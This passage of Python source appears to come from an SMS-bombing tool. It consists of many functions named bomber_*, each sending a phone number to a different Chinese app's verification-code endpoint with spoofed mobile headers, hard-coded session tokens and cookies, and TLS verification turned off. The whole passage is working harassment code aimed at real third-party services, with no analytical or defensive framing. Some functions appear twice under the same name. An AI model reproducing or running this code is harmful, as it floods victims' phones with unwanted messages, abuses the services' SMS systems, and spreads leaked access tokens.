    headers = {'deviceId': 'F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Accept': 'application/json, text/plain, */*', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_lmilive_lmizhibo_com(phone):
    'lmizhibo.com 发送验证码（支持任意手机号）'
    url = 'https://lmilive.lmizhibo.com/app/user/smsCode'
    payload = {'phone': phone}
    headers = {'lmi-device-id': 'app-d89139a347088e15ea12f2744864bb47', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Accept': 'application/json', 'User-Agent': 'Dart/3.10 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_qusimi_cn(phone):
    'qusimi.cn 发送验证码（支持任意手机号）'
    url = 'https://api.qusimi.cn/api/getCode'
    data = {'user_login': phone}
    headers = {'TE': 'gzip, deflate; q=0.5', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 16; PJE110 Build/TP1A.220905.001)'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_api_kuaiyingapp_com(phone):
    url = 'http://api.kuaiyingapp.com/api.php/'
    payload2 = {'s': 'Common.sendSmsCode'}
    payload = {'phone_code': '86', 'scene': 'login', 'app_type_name': '安卓', 'network_status': 'wifi', 'channel': 'common', 'v': 'android_101', 'phone': phone, 'device_brand': 'OnePlus.PJE110', 'os': 'android_16', 'app_type': 'android', 'access_token': 'e2d742c8a33e77527a06999a41af1e6a56d31c5f'}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/3.12.1'}
    requests.post(url, params=payload2, data=payload, headers=headers, timeout=10, verify=False)

def bomber_api_cylive_top(phone):
    url = 'http://api.cylive.top/api.php/'
    payload2 = {'s': 'Common.sendSmsCode'}
    payload = {'phone_code': '86', 'scene': 'login', 'app_type_name': '安卓', 'network_status': 'wifi', 'channel': 'common', 'v': 'android_105', 'phone': phone, 'device_brand': 'OnePlus.PJE110', 'os': 'android_16', 'app_type': 'android', 'meid': '83bae423de964ab6b92bb483662d5462', 'access_token': 'ae2e20f754587d528aba096048c41c826858cdcd'}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/3.12.1'}
    requests.post(url, params=payload2, data=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_wuhanjijin_com(phone):
    'wuhanjijin.com 发送验证码'
    url = 'http://api.wuhanjijin.com/app/auth/sendMessage'
    payload2 = {'phone': phone}
    headers = {'clientid': '', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.6 (dart:io)'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_admin_uxiutv_com(phone):
    'uxiutv.com 发送验证码'
    url = 'https://admin.uxiutv.com/api/sms/send'
    payload = {'event': 'mobile_login', 'mobile': phone}
    headers = {'Content-Type': 'application/json', 'oaid': 'F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157', 'android_currenttimemillis': '1781239037640', 'random': '1.7812390376406248E12', 'imei': '', 'channel': 'oppo', 'model': 'OnePlus-PJE110', 'appversion': '1.7.9.1', 'system': 'Android', 'deviceid': 'OnePlus-PJE110-qcom_0e35fd9b7715a4a6', 'androidid': '', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.3'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_zhibo_ishuaji_cn(phone):
    'ishuaji.cn 发送验证码'
    url = 'https://zhibo.ishuaji.cn/account/user/logincap/v2.html'
    payload = {'cid': 'gdop', 'brand': 'OnePlus', 'device': 'OP5CF9L1', 'model': 'PJE110', 'bootloader': 'unknown', 'phone': phone, 'shell': 'shel172', 'driverid': '445df3c265af2378de3a82390614199ca', 'pkg': 'qiezi', 'manufactruer': 'OnePlus', 'cert': 'R7CKfhGwCn-yC7eWR7s5p7NkCXNKChNKf9bhCQ-wPENl', 'appversion': '50500', 'shareid': '', 'os': 'android', 'extendId': 'DhbApNe7Dh3LCh10pNNKDNoKphtb-3RW-KNwD3-X-7CLfnNXpXbufu-XCXC7CubTfuNxPnsXpupTpQaWp7Nxpwll'}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/3.12.1'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_freevideo_zqqds_cn(phone):
    'zqqds.cn 发送验证码'
    url = 'https://freevideo.zqqds.cn/free-video-portal/portal/1107'
    payload = {'type': 0, 'showAppName': '河马剧场', 'phone': phone}
    headers = {'content-type': 'application/json; charset=utf-8', 'x-request-id': 'a46ae45f-f212-47bf-86a4-22fa2bdc7290', 'wetruwtty': 'mhdfiheowjfcslkjfwojo636', 'datas': '{"freeflow":0,"version":"3.4.0","pname":"com.dz.hmjc","channelCode":"HMTFFQD1000032","utdidTmp":"A202606120027076168uGu1n","token":"","utdid":"114695049b2dbc067822c251105876b5","os":"android","osv":36,"brand":"OnePlus","model":"PJE110","manu":"OnePlus","userId":"2834534307","launch":"shortcut","mchid":"HMTFFQD1000032","nchid":"HMJC1000002","session1":"271916f2-006c-4f42-a159-76239cf570f9","session2":"271916f2-006c-4f42-a159-76239cf570f9","startScene":"shortcut","recSwitch":true,"installTime":1781193865025,"p":55,"nonce":"bd021ffa88964c9aa3aeb9b5a0df16e6","timeZone":"Asia/Shanghai","timestamp":"1781240133876","boxId":"BATWC0+1KvTGG1rgNN6oVJ1iW74nLS9bcPeZOjoe6lJYxqK0P5DFLNEc7DVW8GPRABGHat2ZURdDlGNh4EJBuUQ=="}', 'sign': 'ICe/ickjsxM4lQXRz0jt+1A7qcl5zD0C5xcEvWvRK1s=', 'alg': 'HG45LKBS', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.10.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_zhibo_ishuaji_cn(phone):
    url = 'https://zhibo.ishuaji.cn/account/user/regcap.html'
    payload = {'cid': 'xsop', 'brand': 'OnePlus', 'device': 'OP5CF9L1', 'plat': '12', 'model': 'PJE110', 'bootloader': 'unknown', 'phone': phone, 'shell': 'shell18', 'driverid': '4147a0df2505e5ff8a7a34761cc787550', 'randomid': '6a6867af3e62753145bc1df9235d31f6', 'os2': 'W6���_ݠd', 'pkg': 'xs', 'imsi': '', 'manufactruer': 'OnePlus', 'cert': 'pXokPnoLpX1HfECwpXN5PQC5ChayCnRyfEoxCh37C9el', 'appversion': '30503', 'os': 'android', 'extendId': 'DhbApNe7Dh3LCh10pNNKDNoKphtb-3RW-KNwD3-X-7CLfnNXpXbufu-XCXC7CubTfuNxPnsXpupTpQaWp7Nxpwll'}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/3.12.1'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=False)

def bomber_passport_xinpianchang_com(phone):
    'xinpianchang.com 发送验证码'
    url = 'https://passport.xinpianchang.com/api/user-center/captcha/send'
    payload = {'type': 5, 'regionCode': '+86', 'phone': phone}
    headers = {'Cookie': 'Device_ID=4d1e5fb0-5a3a-45e1-b4c2-471eb2057929; Authorization=0EC53039DD27BE709DD27B4BC1DD27BA11CDD27BD1E21A692F85', 'content-type': 'application/json; charset=UTF-8', 'sa-distinct-id': 'fcc2b455796a3ed2ab72f7423a8d94f4', 'authorization': '0EC53039DD27BE709DD27B4BC1DD27BA11CDD27BD1E21A692F85', 'accept-version': '2.4.2', 'accept-language': 'zh-CN', 'device-id': 'fcc2b455796a3ed2ab72f7423a8d94f4', 'cache-control': 'max-age=0', 'Accept-Encoding': 'gzip', 'Accept': 'application/json', 'User-Agent': 'NewStudios/2.9.2 (com.xinpianchang.newstudios; build:2920; Android 16; Android 16; OnePlus PJE110)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_njtianyiwl_cn(phone):
    'njtianyiwl.cn 发送验证码（需要登录，可能无效）'
    url = 'https://njtianyiwl.cn/app-api/member/auth/send-sms-code'
    payload = {'scene': '1', 'mobile': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_mlive_cdinmu_com(phone):
    url = 'https://mlive.cdinmu.com/srv/app-auth/send-code'
    payload = {'areaCode': '+86', 'mobPhone': phone}
    headers = {'Cookie': 'uuid=c17a2de2-3145-4396-a074-7f34c176c6ae', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'okhttp/4.12.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_zfs_601book_com(phone):
    '601book.com 发送验证码'
    url = 'https://zfs.601book.com/api/fastApp/nologin/sendSms'
    payload2 = {'channelNum': '600001', 'replaceShortDramaWithVideo': '0', 'appId': 'com.youmai.fan', 'phone': phone}
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'package_name': '', 'version': '1.2.0.1', 'access_token': '161478025_975c7926a89c44528f83942a9f791852', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.11.0'}
    requests.post(url, data=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_116_62_116_54(phone):
    url = 'http://116.62.116.54:8096/youge-app/api/v1/sms/aliSend'
    payload = {'event': 'register', 'is_test': '0', 'mobile': phone, 'auth_type': ''}
    headers = {'versionNum': '18', 'version': '1.2.4', 'type': 'Android', 'TOKEN': '', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/4.4.0', 'Host': '116.62.116.54:8096'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_app_boguapp_top(phone):
    'boguapp.top 发送验证码'
    url = 'http://app.boguapp.top/api/sms/send'
    payload = {'mobile': phone, 'event': 'register'}
    headers = {'token': '', 'platform': 'android', 'source_model': 'mobile', 'Accept-Encoding': 'identity', 'User-Agent': 'Android'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=False)

def bomber_91f_xyz(phone):
    '91f.xyz 发送验证码'
    url = 'http://91f.xyz:8080/user/sendVerifyCode'
    payload2 = {'phoneNumber': phone}
    headers = {'Content-Type': 'application/json;charset=UTF-8', 'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept', 'APP_VERSION': '2.0.22', 'IS_APP_REQ': 'APP_REQ', 'Access-Control-Allow-Origin': '*', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)', 'Host': '91f.xyz:8080'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_z_t_o_com(phone):
    'z-t-o.com 发送验证码'
    url = 'http://api.z-t-o.com:8080/api/phone/send-code'
    payload = {'phoneNumber': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.6 (dart:io)', 'Host': 'api.z-t-o.com:8080'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_www_hengxingai_net(phone):
    'hengxingai.net 发送验证码'
    url = 'https://www.hengxingai.net/v2/login/getLoginCode'
    payload = {'user_login': phone}
    headers = {'TE': 'gzip, deflate; q=0.5', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 16; PJE110 Build/TP1A.220905.001)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_app_xgg_minshengji_com(phone):
    'minshengji.com 发送验证码'
    url = 'https://app.xgg.minshengji.com/xggapi/api/login/getSmsCode'
    payload = {'time': '1781256456', 'source': 'android', 'sign': '5cd6ee3d27de727bb45da4e6f977d5e4', 'mobileid': 'ad5cdf12a29d08c7c2daf72d8c7093d1', 'mobile': phone, 'country_code': '86'}
    headers = {'Content-Type': 'application/json;charset=utf-8', 'referer': 'https://app.xgg.minshengji.com', 'Accept-Language': 'zh-CN,zh;q=0.8', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp-okgo-3.11.0?mod=PJE110&os=16&api=36&man=OnePlus&pad=0&emu=0&width=1080&height=2376&appVer=1.2.7'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_api_front_maimaidashop_com(phone):
    'maimaidashop.com 发送验证码'
    url = 'https://api.front.maimaidashop.com/api/front/login/send/code'
    payload = {'phone': phone}
    headers = {'Content-Type': 'application/json; charset=utf-8', 'request-source': 'APP', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.12.13'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_api_bjxunyu_com(phone):
    'bjxunyu.com 发送验证码'
    url = 'https://api.bjxunyu.com/xunyu/user/code/send'
    payload = {'method': 'phone', 'code_type': 'login', 'target': phone}
    headers = {'authorization': 'Bearer', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.9 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_api_ranwenba8_vip(phone):
    'ranwenba8.vip 发送验证码'
    url = 'https://api.ranwenba8.vip/api/v1/auth/send-code'
    payload = {'phone': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Accept': 'application/json', 'User-Agent': 'Dart/3.8 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_echoic_cn(phone):
    'echoic.cn 发送验证码'
    url = 'https://api.echoic.cn/api/sms/send'
    payload = {'scene': 1, 'phone': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Accept': 'application/json', 'User-Agent': 'Dart/3.11 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_newduanju_xinyueyukj_com(phone):
    'xinyueyukj.com 发送验证码'
    url = 'https://newduanju.xinyueyukj.com/api/public/sendSms'
    payload = {'sign': 'login', 'mobile': phone}
    headers = {'x-jx-signature': '2e84bd20763d3b6a75b84fe5d936e78fc2d11a6efd55aec4a8797770ec9cadff', 'x-jx-timestamp': '1781258072', 'x-jx-nonce': '37b324ac-e61e-4f21-aee4-40bf58c7e309', 'deviceid': '', 'version': '1.4.2', 'device': 'android', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.12.0'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_items_shenshuangjc_com(phone):
    url = 'https://items.shenshuangjc.com/api/code/sendPhoneVerifyCode'
    payload = {'user_sessionId': 'Av09kbbtacqeZkS8jsOBDWvpW9AjtQsW', 'verify_code': None, 'type': '1', 'mobile': phone}
    headers = {'Cookie': 'PHPSESSID=Av09kbbtacqeZkS8jsOBDWvpW9AjtQsW', 'Client-Type': 'android', 'Sessid': 'Av09kbbtacqeZkS8jsOBDWvpW9AjtQsW', 'Token': 'false', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_appapi_cqryjkxxzx_top(phone):
    'cqryjkxxzx.top 发送验证码'
    url = 'https://appapi.cqryjkxxzx.top/App/SendSMS'
    payload2 = {'mobile': phone}
    headers = {'content-length': '0', 'x-market': 'qh', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.12.0'}
    requests.post(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_fly_daoran_tv(phone):
    'daoran.tv 发送验证码'
    url = 'https://fly.daoran.tv/API_UBP/send/login/code'
    payload = {'item': 'o3', 'sign': 'MmhTLnUjLLHi48rk9zwBANI3OX3f5EffDpHK7XK6pDYsKlViUBkEq2L3rvuB9paLIxg/fdNDY3DZ/pO3447Ipg==', 'userId': '215d049b47e9e4f4666bf96848ad2775', 'project': 'lyhxcx', 'phoneNumber': phone}
    headers = {'Cookie': 'JSESSIONID=D0EAFF1A08B9B982AFBF962462F46C7C', 'Content-Type': 'application/json; charset=UTF-8', 'item': 'o3', 'project': 'lyhxcx', 'sign': 'MmhTLnUjLLHi48rk9zwBANI3OX3f5EffDpHK7XK6pDYsKlViUBkEq2L3rvuB9paLIxg/fdNDY3DZ/pO3447Ipg==', 'md5': 'SkvyrWqK9QHTdCT12Rhxunjx+WwMTe9y4KwgeASFDhbYabRSPskR0Q==', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/3.12.10'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_api_dafdk_cn(phone):
    'dafdk.cn 发送验证码'
    url = 'http://api.dafdk.cn:8080/auth/send_captcha'
    payload = {'type': 'register', 'mobile': phone}
    headers = {'Cookie': 'XSRF-TOKEN=eyJpdiI6ImVDNzBrb3g4a0syL0txdXUiLCJ2YWx1ZSI6Ijk1RkNFOUdoTGN3VFNDTUlkSkNxdWpwa3FGN09xUkhRb0RtMjNpc3RodFE1MWxxRlk4N21xZXlaU3JpWHp6RDR4M3UxUzZ5aytXS0FlYmVsRGp5a3pWa1AwUDcvdThyN0EvUkowc093RVdFYSIsIm1hYyI6IiIsInRhZyI6IjVxWXhjV1lTR3JNYWpidjVna0JBQXc9PSJ9; _session=eyJpdiI6IkdjSjlmVEtvYnlyTEdIV2YiLCJ2YWx1ZSI6Ijg4eUU1TnpNanJycnI5T0NpUTZHMERGR3NWbXlzem5iR0dZQkVKSWszTlFwVzEyKzhuaHN4NGg3cXhtTE9kaWFoYVhMYzQxUVJENWhGbzE4MFhJczVVb1JLNURRRzdtbzlWMjVkUnFoMjdZaiIsIm1hYyI6IiIsInRhZyI6IlFtWG8wRUJRQ3JWZVhQdHJOZkp4cVE9PSJ9', 'Content-Type': 'application/json; charset=utf-8', 'Authorization': 'Bearer', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/3.12.13', 'Host': 'api.dafdk.cn:8080'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_app_api_quick_bimo8_com(phone):
    'bimo8.com 发送验证码'
    url = 'https://app-api.quick.bimo8.com/panda/code'
    payload2 = {'type': '3', 'mobile': phone}
    headers = {'client-token': 'V2.VneEKVEPK0FVM5rq.9474d0824557ce325b24427dd0155ffd', 'client-brand': 'OnePlus', 'client-version': '1.3.0', 'client-type': 'app-series', 'client-name': 'huaguoshanapp', 'client-model': 'PJE110', 'client-os': 'android', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.9 (dart:io)'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_aizhenyue_com(phone):
    url = 'https://api.aizhenyue.com/api/sms/send'
    payload2 = {'t': '1781259832853'}
    payload = {'event': 'smlogin', 'mobile': phone}
    headers = {'token': '', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, params=payload2, json=payload, headers=headers, timeout=10, verify=False)

def bomber_xzw_api_xingzhits_cn(phone):
    url = 'https://xzw.api.xingzhits.cn/app/verify/login/sms/code/send'
    payload = {'mobile': phone}
    headers = {'Content-Type': 'application/json; charset=UTF-8', 'deviceId': '2f7f5cae6297f37f2b49e366ae2b61535', 'clientSource': '1', 'appVersion': '95', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/4.12.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_wdjapi_qingk_cn(phone):
    'qingk.cn 发送验证码'
    url = 'https://wdjapi.qingk.cn/login/sendVerifyCode'
    payload2 = {'platform': 'android', 'android_id': 'b8f5f1f428a19f6c', 'idfv': '', 'version_name': '2.1.3', 'version_code': '213', 'package_name': 'com.haikan.hicontheater', 'passid': '10001', 'yy_appid': '1001', 'phoneNum': phone}
    headers = {'udid': '1e71e49635030cf628e3518d2b7f5dcb30d75e167dd2f96f875007da4a2e4b04', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.8 (dart:io)'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_aizhenyue_com(phone):
    'aizhenyue.com 发送验证码'
    url = 'https://api.aizhenyue.com/api/sms/send'
    payload2 = {'t': '1781268509916'}
    payload = {'event': 'smlogin', 'mobile': phone}
    headers = {'token': '', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, params=payload2, json=payload, headers=headers, timeout=10, verify=False)

def bomber_xzw_api_xingzhits_cn(phone):
    'xingzhits.cn 发送验证码'
    url = 'https://xzw.api.xingzhits.cn/app/verify/login/sms/code/send'
    payload = {'mobile': phone}
    headers = {'Content-Type': 'application/json; charset=UTF-8', 'deviceId': '2f7f5cae6297f37f2b49e366ae2b61535', 'clientSource': '1', 'appVersion': '95', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/4.12.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_htvideo_portal_api_sywj_cn(phone):
    'sywj.cn 发送验证码'
    url = 'https://htvideo-portal-api.sywj.cn/auth/sms/login/code'
    payload = {'mobile': phone}
    headers = {'content-type': 'application/json; charset=UTF-8', 'x-device-id': '6786e6bb3cd9fa0747673281a25a0a92', 'token': '', 'Accept-Encoding': 'gzip', 'User-Agent': 'sywj/2.3.0 Android OnePlus/PJE110 Android16 SDK36 oppo'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_m_yidanbo_com(phone):
    'yidanbo.com 发送验证码'
    url = 'https://m.yidanbo.com/api/v2/wanlshop/sms/send'
    payload = {'mobile': phone, 'event': 'register', 'areacode': '+86'}
    headers = {'uuid': '005fdfbe3d794882910997edb690b403', 'App-Client': 'app-wanlshop', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Sign': '5dad305868dbc6d563efff680c1869ed', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_dance202_ynbit_com(phone):
    'ynbit.com 发送验证码'
    url = ''.join(['https://dance202.ynbit.com/appuser/verifycode/', str(phone)])
    headers = {'platformtype': 'Android', 'content-type': 'application/json', 'buildnumber': '113', 'packagename': 'com.ynbit.yunguangshiting', 'application': 'YnBitApp', 'appversion': '2.0.163', 'deviceid': '487239f613ff6097', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.5 (dart:io)'}
    requests.get(url, headers=headers, timeout=10, verify=(1 == 0))

def bomber_rkrddepa_fjgdwl_com(phone):
    'fjgdwl.com 发送验证码'
    url = ''.join(['https://rkrddepa.fjgdwl.com/fujuApp/api/user/login/smsCode/', str(phone)])
    payload = {'data': {}, 'version': '1.2.8', 'accessToken': '', 'deviceId': '536f4d1024555999fa985f829e1e54e6'}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.10 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_appapi_whhsxxgs_top(phone):
    'whhsxxgs.top 发送验证码'
    url = 'https://appapi.whhsxxgs.top/App/SendSMS'
    payload2 = {'mobile': phone}
    headers = {'Cookie': '7ba146e1-21d1-4db6-a404-2934e42eab1c=9f8eeeecba2ae1677ce7ab38eef42179', 'Content-Length': '0', 'X-Market': 'JM', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/4.12.0'}
    requests.post(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_www_hzbzh_com(phone):
    'hzbzh.com 发送验证码'
    url = 'https://www.hzbzh.com/prod-api/auth/app/sms/code'
    data = {'scene': 'login', 'mobile': phone}
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_app_api_meowhub_cn(phone):
    'meowhub.cn 发送验证码'
    url = 'https://app.api.meowhub.cn/api/app/auth/sms/send'
    payload = {'scene': 'login', 'mobile': phone}
    headers = {'clientid': 'hycollect_app', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.11 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_www_shengyinjiazhi_com(phone):
    'shengyinjiazhi.com 发送验证码'
    url = 'https://www.shengyinjiazhi.com/api/captchaSms'
    payload = {'phonenumber': phone}
    headers = {'Content-Type': 'application/json; charset=utf-8', 'authorization': 'Bearer', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'uni-app-x/5.04'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_capybara_yangjian_co(phone):
    'yangjian.co 发送验证码'
    url = 'https://capybara.yangjian.co/api/v1/auth/sms/send'
    payload = {'type': 'register', 'phone': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.12.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_shouzhetianxia_com(phone):
    url = 'https://api.shouzhetianxia.com/applet/user/sendCode'
    payload = {'phonenumber': phone}
    headers = {'Authorization': 'Bearer undefined', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_app_test_taskmessage_com(phone):
    'taskmessage.com 发送验证码'
    url = 'https://app.test.taskmessage.com/rx_api/sendMobileCode'
    payload = {'mobile': phone}
    headers = {'logintoken': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImtleUlkIn0.eyJpc3MiOiJzb2wiLCJhdWQiOiJ1c2VyIiwibmJmIjoxNzgxMzM0ODczLCJpYXQiOjE3ODEzMzQ4NzMsIm1vYmlsZSI6IiIsInVzZXJfaWQiOiIzNjAifQ.Xe1xftLZUJ7cei18yz7jLhCGLq0amPezSLp1Wyt1DgM', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_dfu_zklf_tech_com(phone):
    url = 'https://dfu.zklf-tech.com/api/v1/auth/sms/code'
    payload2 = {'mobile': phone, 'smsType': 'REGISTER'}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/5.2.0'}
    requests.post(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_ppl_ming_net_cn(phone):
    'ming.net.cn 发送验证码'
